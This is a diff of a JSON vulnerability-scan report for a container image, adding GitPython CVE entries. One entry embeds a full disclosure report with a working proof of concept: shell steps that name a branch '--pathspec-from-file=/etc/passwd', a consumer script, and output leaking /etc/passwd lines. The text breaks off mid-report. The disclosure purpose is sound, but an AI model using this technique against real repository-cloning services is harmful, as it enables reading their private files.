@@ -1,7 +1,7 @@
 {
   "tool": "mageck-vispr",
-  "scan_timestamp": "2026-10-01T09:41:25Z",
-  "workflow_run_id": "36837607073",
+  "scan_timestamp": "2026-11-01T10:34:32Z",
+  "workflow_run_id": "41291059443",
   "versions": {
     "0.5.6": {
       "image": "ghcr.io/bundlecore/products/bfx/mageck-vispr:0.5.6",
@@ -289,6 +289,7 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-78676",
+            "https://advisory.echohq.com/cve/CVE-2026-78676",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-284h-m62q-gf8w",
             "https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2026-3786.yaml",
@@ -297,7 +298,7 @@
             "https://www.vulncheck.com/advisories/gitpython-before-remote-code-execution-via-config-injection"
           ],
           "PublishedDate": "2026-08-25T02:16:52.03Z",
-          "LastModifiedDate": "2026-09-02T19:13:44.823Z"
+          "LastModifiedDate": "2026-10-12T15:10:00.207Z"
         },
         {
           "VulnerabilityID": "CVE-2023-40590",
@@ -428,6 +429,65 @@
           "LastModifiedDate": "2026-06-17T07:10:54.203Z"
         },
         {
+          "VulnerabilityID": "CVE-2026-114145",
+          "VendorIDs": [
+            "GHSA-83vg-56qc-22m7"
+          ],
+          "PkgName": "GitPython",
+          "PkgPath": "usr/local/lib/python3.7/site-packages/GitPython-3.1.11.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.11",
+            "UID": "7b34501ac43b3b82"
+          },
+          "InstalledVersion": "3.1.11",
+          "FixedVersion": "3.2.1",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0cb5355ba37933c73fd8950476d33131a09b49ff34f16506b2d1d68ac473304b",
+            "DiffID": "sha256:dc0e076fbc49ff783c909261129dee2a1bb33712c8969fff7b3829c679611ac1"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-114145",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:adee70e950cf195e4dfa679f06f71461c374d64df7dfa913477d06ee8263d12e",
+          "Title": "GitPython: GitPython: arbitrary code execution via improper submodule path validation",
+          "Description": "GitPython is a python library used to interact with Git repositories. Prior to 3.2.1, create_submodule() in git/objects/submodule/base.py accepts an attacker-influenced submodule path such as .git/hooks and invokes _clone_repo() before safely rejecting the destination. In 3.1.x, _validate_repo_path() does not exist and the call succeeds silently, while in 3.2.0 and later affected revisions the check in git/index/base.py raises ValueError only after the clone has written to disk and does not remove the planted file. An attacker-controlled submodule can therefore place an executable post-checkout hook that a later Git operation executes. Exploitation requires an application to accept an untrusted submodule path and a clone destination such as .git/hooks that is empty enough for Git to clone into it, which commonly means that default sample hooks are absent. This issue is fixed in version 3.2.1.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-696"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-114145",
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/commit/97eadb888d2f99567e3113f4e455be4ca128f697",
+            "https://github.com/gitpython-developers/GitPython/pull/2264",
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.2.1",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-83vg-56qc-22m7",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-114145",
+            "https://www.cve.org/CVERecord?id=CVE-2026-114145"
+          ],
+          "PublishedDate": "2026-10-21T21:17:57.25Z",
+          "LastModifiedDate": "2026-10-23T15:17:25.77Z"
+        },
+        {
           "VulnerabilityID": "CVE-2026-42284",
           "VendorIDs": [
             "GHSA-x2qx-6953-8485"
@@ -481,6 +541,8 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-42284",
+            "https://advisory.echohq.com/cve/CVE-2026-42284",
+            "https://github.com/advisories/GHSA-x2qx-6953-8485",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.47",
             "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-x2qx-6953-8485",
@@ -548,6 +610,7 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-44243",
+            "https://advisory.echohq.com/cve/CVE-2026-44243",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.48",
             "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-7545-fcxq-7j24",
@@ -607,6 +670,7 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-44244",
+            "https://advisory.echohq.com/cve/CVE-2026-44244",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.49",
             "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-v87r-6q3f-2j67",
@@ -665,6 +729,7 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-67322",
+            "https://advisory.echohq.com/cve/CVE-2026-67322",
             "https://github.com/advisories/GHSA-rwj8-pgh3-r573",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/8ac5a30519b6f4af85398b9b9d7064ff4d452da2",
@@ -678,7 +743,7 @@
             "https://www.vulncheck.com/advisories/gitpython-before-environment-variable-exfiltration-via-clone-from"
           ],
           "PublishedDate": "2026-08-01T13:17:02.493Z",
-          "LastModifiedDate": "2026-09-03T16:11:43.633Z"
+          "LastModifiedDate": "2026-10-23T23:10:00.157Z"
         },
         {
           "VulnerabilityID": "CVE-2026-67323",
@@ -728,6 +793,7 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-67323",
+            "https://advisory.echohq.com/cve/CVE-2026-67323",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/701ce32fe5ba8cb622c0e0342a376a6beb47d738",
             "https://github.com/gitpython-developers/GitPython/pull/2163",
@@ -738,7 +804,7 @@
             "https://www.vulncheck.com/advisories/gitpython-before-command-injection-via-unguarded-git-options"
           ],
           "PublishedDate": "2026-08-01T13:17:02.637Z",
-          "LastModifiedDate": "2026-09-03T16:11:29.863Z"
+          "LastModifiedDate": "2026-10-23T23:10:00.157Z"
         },
         {
           "VulnerabilityID": "CVE-2026-67325",
@@ -788,6 +854,7 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-67325",
+            "https://advisory.echohq.com/cve/CVE-2026-67325",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/56806080c1348749b07daa4a2024ce47b3cad285",
             "https://github.com/gitpython-developers/GitPython/pull/2161",
@@ -798,7 +865,75 @@
             "https://www.vulncheck.com/advisories/gitpython-before-command-injection-via-option-prefix-abbreviation"
           ],
           "PublishedDate": "2026-08-01T13:17:02.923Z",
-          "LastModifiedDate": "2026-09-03T16:10:18.99Z"
+          "LastModifiedDate": "2026-10-23T23:10:00.157Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-69097",
+          "VendorIDs": [
+            "GHSA-3rp5-jjmw-4wv2"
+          ],
+          "PkgName": "GitPython",
+          "PkgPath": "usr/local/lib/python3.7/site-packages/GitPython-3.1.11.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.11",
+            "UID": "7b34501ac43b3b82"
+          },
+          "InstalledVersion": "3.1.11",
+          "FixedVersion": "3.1.53",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0cb5355ba37933c73fd8950476d33131a09b49ff34f16506b2d1d68ac473304b",
+            "DiffID": "sha256:dc0e076fbc49ff783c909261129dee2a1bb33712c8969fff7b3829c679611ac1"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-69097",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:18935692c0811ef59e87e2e4ffebcbd7fdf0407bbbc43ac9e9de78463fb0723e",
+          "Title": "gitpython: GitPython: Remote Code Execution via Config Injection in Submodule Names",
+          "Description": "GitPython before 3.1.53 fails to properly escape section names in git config files, allowing attackers to inject arbitrary configuration directives through malicious submodule names. Attackers can inject core.sshCommand or other dangerous config keys into the victim's .git/config via create_submodule or clone_from operations, achieving remote code execution when git performs ssh operations.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-74"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7.3
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-69097",
+            "https://advisory.echohq.com/cve/GHSA-3rp5-jjmw-4wv2",
+            "https://github.com/advisories/GHSA-3rp5-jjmw-4wv2",
+            "https://github.com/gitpython-developers/GitPython",
+            "https://github.com/gitpython-developers/GitPython/commit/1ed1b924f4e2d2ee7bab296df77b978af21853f1",
+            "https://github.com/gitpython-developers/GitPython/pull/2176",
+            "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.53",
+            "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3rp5-jjmw-4wv2",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2026-3981.yaml",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-69097",
+            "https://www.cve.org/CVERecord?id=CVE-2026-69097",
+            "https://www.vulncheck.com/advisories/gitpython-before-config-injection-via-submodule-names"
+          ],
+          "PublishedDate": "2026-08-03T14:16:30.677Z",
+          "LastModifiedDate": "2026-10-23T21:10:00.157Z"
         },
         {
           "VulnerabilityID": "CVE-2026-76218",
@@ -853,6 +988,8 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-76218",
+            "https://advisory.echohq.com/cve/CVE-2026-76218",
+            "https://github.com/advisories/GHSA-9rj7-rf2p-w77r",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/d9ddb55bdc66",
             "https://github.com/gitpython-developers/GitPython/pull/2204",
@@ -913,6 +1050,8 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-76219",
+            "https://advisory.echohq.com/cve/CVE-2026-76219",
+            "https://github.com/advisories/GHSA-4gmw-gg2m-w46p",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/9b5dcaf85da5946dbf69dcd53f9edba08f760b32",
             "https://github.com/gitpython-developers/GitPython/pull/2204",
@@ -973,6 +1112,8 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-76220",
+            "https://advisory.echohq.com/cve/CVE-2026-76220",
+            "https://github.com/advisories/GHSA-wvpp-8hx9-p66j",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/96a888f4d782cb2f80452148e48e60ce4af6d541",
             "https://github.com/gitpython-developers/GitPython/pull/2204",
@@ -1033,6 +1174,8 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-76222",
+            "https://advisory.echohq.com/cve/CVE-2026-76222",
+            "https://github.com/advisories/GHSA-hmq2-w58f-27jc",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/4299c990e1ca21896f9485277caf7bb0ae5b404c",
             "https://github.com/gitpython-developers/GitPython/commit/e4b8e7d026ca6abb4cf604f8e77093432ce23c06",
@@ -1102,6 +1245,7 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-78675",
+            "https://advisory.echohq.com/cve/CVE-2026-78675",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/ef7568e3b317ce617eacda39b8b54dcdff8c3b5c",
             "https://github.com/gitpython-developers/GitPython/pull/2211",
@@ -1113,7 +1257,7 @@
             "https://www.vulncheck.com/advisories/gitpython-before-local-file-content-disclosure-via-gitmodules"
           ],
           "PublishedDate": "2026-08-25T02:16:51.887Z",
-          "LastModifiedDate": "2026-09-02T19:26:24.523Z"
+          "LastModifiedDate": "2026-10-12T15:10:00.207Z"
         },
         {
           "VulnerabilityID": "CVE-2026-78677",
@@ -1165,6 +1309,7 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-78677",
+            "https://advisory.echohq.com/cve/CVE-2026-78677",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/b68afff45af0f49e79a3e2d2162018986b37ad5d",
             "https://github.com/gitpython-developers/GitPython/pull/2210",
@@ -1176,7 +1321,7 @@
             "https://www.vulncheck.com/advisories/gitpython-before-path-traversal-via-separate-git-dir"
           ],
           "PublishedDate": "2026-08-25T02:16:52.173Z",
-          "LastModifiedDate": "2026-09-02T19:12:24.23Z"
+          "LastModifiedDate": "2026-10-12T15:10:00.207Z"
         },
         {
           "VulnerabilityID": "CVE-2026-87817",
@@ -1226,6 +1371,7 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-87817",
+            "https://advisory.echohq.com/cve/CVE-2026-87817",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/c7cf4d13b1ed0a2e70f2a1f3c6b4fc6c2652cf0b",
             "https://github.com/gitpython-developers/GitPython/pull/2218",
@@ -1265,32 +1411,86 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
           },
           "Fingerprint": "sha256:145bc775d4190168029c5df573fd96d9fcefdbfd4418353779e5f07ce21ac4d7",
-          "Title": "GitPython before 3.1.60 contains a regular expression denial of servic ...",
+          "Title": "GitPython: GitPython: Denial of Service via crafted commit author field",
           "Description": "GitPython before 3.1.60 contains a regular expression denial of service vulnerability in Actor.name_email_regex that processes commit author and committer fields. Attackers can craft a commit object with a malformed author field containing an unterminated angle bracket to cause quadratic backtracking, exhausting CPU resources for over two minutes per commit access.",
           "Severity": "HIGH",
           "CweIDs": [
             "CWE-1333"
           ],
           "VendorSeverity": {
-            "ghsa": 3
+            "ghsa": 3,
+            "redhat": 3
           },
           "CVSS": {
             "ghsa": {
               "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
               "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-87819",
+            "https://advisory.echohq.com/cve/CVE-2026-87819",
             "https://github.com/gitpython-developers/GitPython",
             "https://github.com/gitpython-developers/GitPython/commit/751473a5f3221d6f989291cbebcc404353fd3ba8",
             "https://github.com/gitpython-developers/GitPython/pull/2215",
             "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.60",
             "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-g5vv-9gxw-82hx",
             "https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2026-3984.yaml",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-87819",
+            "https://www.cve.org/CVERecord?id=CVE-2026-87819",
             "https://www.vulncheck.com/advisories/gitpython-before-3.1.60-denial-of-service-via-redos"
           ],
           "PublishedDate": "2026-09-09T12:17:17.12Z",
           "LastModifiedDate": "2026-09-18T18:17:34.697Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-23mf-xhv8-69c2",
+          "PkgName": "GitPython",
+          "PkgPath": "usr/local/lib/python3.7/site-packages/GitPython-3.1.11.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.11",
+            "UID": "7b34501ac43b3b82"
+          },
+          "InstalledVersion": "3.1.11",
+          "FixedVersion": "3.2.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0cb5355ba37933c73fd8950476d33131a09b49ff34f16506b2d1d68ac473304b",
+            "DiffID": "sha256:dc0e076fbc49ff783c909261129dee2a1bb33712c8969fff7b3829c679611ac1"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-23mf-xhv8-69c2",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:b6482c12c6292cf0286041562007c3caae409f6601e976bb34db6c8e1913a51e",
+          "Title": "GitPython: arbitrary file read via attacker-controlled branch name in `Head.checkout()` (incomplete fix of CVE-2026-78679)",
+          "Description": "> **A note on the referenced files.** This report was submitted through GitHub's private\n> vulnerability reporting API, which carries no attachments. Every transcript this report leans\n> on is reproduced **inline above**, verbatim. The file names it mentions (`poc.sh`, `poc.log`,\n> per-case transcripts, `evidence.md`, `negative-controls.md`, blob-sweep tables) are the local\n> evidence bundle those inline excerpts were extracted from, with a checksum manifest. I am happy\n> to send the bundle by any channel you prefer, or to open a private fork — just say which. The\n> PoC scripts are self-contained and reproduce the result from a clean environment.\n\n---\n\n**Affected:** `<= 3.1.62` — all published releases; also `main` @ `4905b4af`\n**Verified at runtime:** GitPython `3.1.62` with git `2.55.0`\n**Date:** 2026-09-10\n**Reporter:** MAXI8594\n\n---\n\n## Threat model\n\n| | |\n|---|---|\n| **Attacker** | anyone who can get the application to clone a URL they control. No account, no credential, no privilege in the consuming application. |\n| **Pre-need** | a repository they host, with `HEAD` pointing at a branch whose name is the payload. A `git push` to a plain git server is enough — no filesystem access to a server is required (`raw/06`). |\n| **Gets** | the contents of any file the application's process can read, returned in band through the exception. `/etc/passwd` recovered 34 of 34 lines. |\n| **Real-world likelihood** | **High.** The vulnerable consumer is six lines of ordinary code with no unusual configuration: `Repo.clone_from(user_url)` then `repo.active_branch.checkout()`. `allow_unsafe_options=False` is the default. Cloning user-supplied URLs is the library's central use case — CI systems, repository importers, scanners and bots. |\n\n**On severity relative to the sibling advisories.** GitHub, as CNA, scored the three prior\nadvisories in this class at 6.5 / `PR:L` (CVE-2026-76217, CVE-2026-78678, CVE-2026-78679). This\nreport asks for 7.5 / `PR:N`, and the difference is one measured fact: in those three, the\napplication had to pass an attacker-influenced value into the API. Here it passes nothing — the\nclone materialises the hostile branch on its own and `repo.active_branch` returns it\n(`raw/02`). If that reading is not accepted, the `PR:L` path via `Repo.create_head()` is also real\nand lands at 6.5, matching the siblings.\n\n## Summary\n\n`Head.checkout()` guards its `**kwargs` against unsafe Git options but never inspects its own\npositional argument — the branch name — which reaches the `git checkout` argv with no `--`\nseparator. A repository whose default branch is named `--pathspec-from-file=/etc/passwd` makes a\nconsumer that merely clones it and checks out the default branch return the entire contents of that\nfile to the caller.\n\nThis is the exact combination of two advisories the project already fixed:\n\n- **CVE-2026-76217** (`GHSA-hh9p-6wh2-4mfc`) — *\"Arbitrary file read via `--pathspec-from-file` in\n  `IndexFile.remove()` **and `Head.checkout()`**\"*. Fixed in 3.1.58 by commit `f2550b65`, which added\n  the guard to this exact method — but only for `**kwargs`.\n- **CVE-2026-78679** (`GHSA-3wxw-xv34-2frg`) — *\"`TagReference.create` positional reference\n  bypasses kwargs-only `--file` guard, enabling arbitrary file read (incomplete fix of 3af0c251)\"*. Fixed in 3.1.59 by commit `1b0d2d9b`, which applied the\n  positional check to `git/refs/tag.py`, `git/diff.py`, `git/index/base.py` and `git/repo/base.py` —\n  but not to `git/refs/head.py:286`.\n\n`f2550b65` states in its own commit message that the audit found the positional variant and applied\nit to `HEAD.reset` — 185 lines above `Head.checkout`, in the same file, in the same commit:\n\n> \"The audit also found that **reset's positional commit could carry the option before its argument\n> separator**. […] **Check reset's positional commit as well as keyword options**\"\n\n`HEAD.reset` got the fix. `Head.checkout` did not, and `1b0d2d9b` did not come back for it.\n\n## Affected Asset\n\n| | |\n|---|---|\n| Package | `GitPython` (PyPI) |\n| Affected versions | **`<= 3.1.62`** — all published releases |\n| Latest release tested | `3.1.62` |\n| Also present on | `main` @ `4905b4af` |\n| Vulnerable file | `git/refs/head.py` |\n| Guard | line 286 — `Git._option_candidates([], kwargs)` |\n| Sink | line 293 — `self.repo.git.checkout(self, **kwargs)` |\n| CWE | CWE-88 (Argument Injection), CWE-73 (External Control of File Name or Path), CWE-200 (Exposure of Sensitive Information) |\n| CVSS 3.1 | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **7.5 High** |\n\nThe version range was established by **blob hash against every tag**, not by dates: the sink line\n`self.repo.git.checkout(self, **kwargs)` — with no `--` separator — is present in `git/refs/head.py`\nin every tag from `0.3.1-beta2` through `3.1.62`. The `3.1.62` blob is byte-identical to `main`:\n`7f563374ef9e018b3d5f95054498e8591e112ce2`. Full sweep in `raw/07-blob-version-sweep.txt`.\n\nThe kwargs-only guard first appears in **3.1.58**, so `3.1.58`–`3.1.62` is where \"incomplete fix\"\napplies; earlier releases have the same sink with no guard at all.\n\n## Vulnerability Details\n\n### Root cause\n\n`git/cmd.py:1045` — `_option_candidates()` only inspects the positionals it is handed:\n\n```python\n@classmethod\ndef _option_candidates(cls, args: Sequence[Any] = (), kwargs: Optional[Mapping[str, Any]] = None) -> List[str]:\n    \"\"\"Collect possible option spellings before command-line transformation.\"\"\"\n    options = [\n        option for option in cls._unpack_args([arg for arg in args if arg is not None]) if option.startswith(\"-\")\n    ]\n```\n\nSo `_option_candidates([], kwargs)` means: *check the keyword arguments, never check the positional\narguments this method puts on the command line.* That is fine when the method has no\nattacker-influenced positional, or when it separates them with `--`.\n\n`git/refs/head.py:283-293` — `Head.checkout()` has neither:\n\n```python\n        if not allow_unsafe_options:\n            Git.check_unsafe_options(\n                options=Git._option_candidates([], kwargs),\n                unsafe_options=Git.unsafe_git_pathspec_from_file_options,\n            )\n        kwargs[\"f\"] = force\n        if kwargs[\"f\"] is False:\n            kwargs.pop(\"f\")\n\n        self.repo.git.checkout(self, **kwargs)\n```\n\n`self` is the only positional. It serialises to the branch name, lands in the `git checkout` argv,\nand is not in the list the guard inspects. `_call_process` builds `args_list = opt_args + ext_args`,\nso keyword-derived options precede positionals — which is why the rest of the library puts `\"--\"`\nfirst (`Remote.fetch/pull/push`, `Repo._clone`, `Repo.archive`, `IndexFile.remove`, `Commit.count`\nall do). `Head.checkout` does not.\n\n### Why the branch name is attacker-controlled\n\nGit accepts a refname whose branch component begins with `-` and contains `/`\n(`raw/02-refname-accepted-and-cloned.txt`):\n\n```\n>>> git check-ref-format 'refs/heads/--pathspec-from-file=/etc/passwd'\n    exit=0  stderr=''\n    => un refname que empieza con '-' y lleva '/' es VALIDO para git\n\n>>> git -C <bare> update-ref 'refs/heads/--pathspec-from-file=/etc/passwd' beea87239099\n    exit=0  stderr=''\n>>> git -C <bare> symbolic-ref HEAD 'refs/heads/--pathspec-from-file=/etc/passwd'\n    exit=0\n    HEAD del bare = refs/heads/--pathspec-from-file=/etc/passwd\n    ref en disco como arbol jerarquico: True\n\n>>> Repo.clone_from('file://<bare>', <victim>)   # la app solo clona\n    ramas LOCALES creadas por el clone, sin que nadie las pida:\n      refs/heads/--pathspec-from-file=/etc/passwd\n    repo.active_branch.name = '--pathspec-from-file=/etc/passwd'\n    coincide con el nombre hostil: True\n```\n\nThe transcript above also shows the second half: `git clone` **materialises that branch locally on\nits own** when the remote `HEAD` points at it — the consuming application never asks for it.\n\nA plain git server accepts the refname over `receive-pack`, with no `--force` and no special config\n(`raw/06-push-accepts-refname.txt`), so the attacker does not need filesystem access to a server —\na `git push` is enough. That measurement, and the clone in `raw/02`, both use the `file://`\ntransport, which exercises the same git wire protocol as `https://`; I did not test against a\nhosted forge, since that would mean writing to a third party.\n\n### Why the leak reaches the caller\n\nThe file contents are in `CommandError.__str__`, not only in the `.stderr` attribute\n(`git/exc.py`):\n\n```python\n        self.stderr = stderr_decode and \"\\n  stderr: '%s'\" % stderr_decode or \"\"\n\n    def __str__(self) -> str:\n        return (self._msg + \"\\n  cmdline: %s%s%s\") % (\n            self._cmd, self._cause, self._cmdline, self.stdout, self.stderr,\n        )\n```\n\nSo `logging.exception(...)`, `print(e)`, or simply **not catching** the exception all disclose the\nfile. The developer does not have to know `.stderr` exists.\n\n### Full chain\n\n```\nRepo.clone_from(<attacker URL>)\n  ↓  remote HEAD points at refs/heads/--pathspec-from-file=/etc/passwd\n  ↓  git clone creates that LOCAL branch unasked\nrepo.active_branch                → Head with name = \"--pathspec-from-file=/etc/passwd\"\n  ↓\nHead.checkout()                   git/refs/head.py:286 — guard inspects kwargs only\n  ↓  self.repo.git.checkout(self, **kwargs)   git/refs/head.py:293 — no \"--\"\ngit checkout --pathspec-from-file=/etc/passwd\n  ↓  git emits one `error:` per unmatched pathspec — one per line of the file\nGitCommandError → CommandError.__str__ → the consumer\n```\n\n## Steps to Reproduce\n\nEnvironment: GitPython 3.1.62, git 2.55.0, Linux x86_64, disposable venv. Everything local —\ntemporary repositories and the `file://` transport. No remote hosts, no third-party repositories.\n\nThe bundled `poc.sh` runs all seven scenarios as a single unit and writes `poc.log` plus one file per\nscenario under `raw/`. Minimal manual reproduction:\n\n```bash\npython3 -m venv /tmp/gp && /tmp/gp/bin/python -m pip install gitpython==3.1.62\n\nW=$(mktemp -d)\ngit init -q -b main \"$W/a\"; echo x > \"$W/a/f.txt\"\ngit -C \"$W/a\" add f.txt\ngit -C \"$W/a\" -c user.email=a@b -c user.name=a commit -qm c\ngit clone -q --bare \"$W/a\" \"$W/a.git\"\nSHA=$(git -C \"$W/a.git\" rev-parse HEAD)\n\n# the attacker names their default branch after the file they want\ngit -C \"$W/a.git\" update-ref   'refs/heads/--pathspec-from-file=/etc/passwd' \"$SHA\"\ngit -C \"$W/a.git\" symbolic-ref HEAD 'refs/heads/--pathspec-from-file=/etc/passwd'\n\ncat > \"$W/consumer.py\" <<'PYEOF'\nimport logging, sys, git\nlogging.basicConfig(level=logging.INFO, format=\"%(message)s\")\ntry:\n    repo = git.Repo.clone_from(sys.argv[1], sys.argv[2])   # user-supplied URL\n    repo.active_branch.checkout()                          # ensure a clean working tree\nexcept git.exc.GitCommandError:\n    logging.exception(\"clone failed\")\nPYEOF\n\n/tmp/gp/bin/python \"$W/consumer.py\" \"file://$W/a.git\" \"$W/victim\"\n```\n\n### Raw Request\n\nThe real `git checkout` argv, captured by instrumenting `Git.execute` (`raw/01-real-argv.txt`).\nThis is the command GitPython actually built — the branch name became an option:\n\n```\n  argv real : ['git', 'checkout', '--pathspec-from-file=/tmp/gpargv-9im8ao2d/SECRET.txt']\n```\n\n### Raw Response\n\nObserved output (`raw/05-six-line-consumer.txt`, tail) — git emits one `error:` line per unmatched\npathspec, which is one per line of the target file:\n\n```\nerror: pathspec 'mysql:x:958:958:MariaDB:/var/lib/mysql:/usr/bin/nologin' did not match any file(s) known to git\nerror: pathspec 'flatpak:x:957:957:Flatpak system helper:/:/usr/bin/nologin' did not match any file(s) known to git\nerror: pathspec 'wazuh:x:956:955:Wazuh Agent:/var/ossec:/usr/sbin/nologin' did not match any file(s) known to git\nerror: pathspec 'jdownloader:x:955:954:jdownloader:/opt/JDownloader/:/bin/false' did not match any file(s) known to git\nerror: pathspec 'cups-browsed:x:953:953:CUPS printer discovery:/:/usr/bin/nologin' did not match any file(s) known to git'\n```\n\n`raw/03-full-file-disclosure.txt` counts the recovery against the real file:\n\n```\nArchivo objetivo: /etc/passwd  (34 lineas no vacias)\n[CASO] repo.active_branch.checkout()  — nadie paso un nombre de rama\n  repo.active_branch.name = '--pathspec-from-file=/etc/passwd'\n  -> GitCommandError. Lineas de /etc/passwd recuperadas: 34 de 34\n```\n\n## Impact\n\nAn attacker who can get an application to clone a repository they control reads any file the\napplication's process can read, with the contents returned in band. `/etc/passwd` was recovered in\nfull (34 of 34 lines) in the run recorded in `poc.log`.\n\nThe attacker needs **no account and no privilege in the consuming application**, and no\nconfiguration change anywhere: `allow_unsafe_options=False` is the default, and the vulnerable\nconsumer is six lines of ordinary code. This is the central use case of the library — CI systems,\nrepository importers, scanners and bots that clone user-supplied URLs.\n\n### Impact precondition\n\n**Holds if:** the consuming application clones a repository whose default branch name the attacker\nchose, and then calls `Head.checkout()` on it — most commonly as `repo.active_branch.checkout()`,\nwhich needs no branch-name input from the application at all.\n\n**Source writer:** the attacker, via the remote repository's `HEAD` and refs. Verified two ways —\n`git update-ref` + `symbolic-ref` on a bare repository, and `git push` to a plain git server, which\n`receive-pack` accepts without `--force` or special configuration\n(`raw/02-refname-accepted-and-cloned.txt`, `raw/06-push-accepts-refname.txt`). The application never\nwrites the branch name; `git clone` materialises it.\n\n**Observed in:** 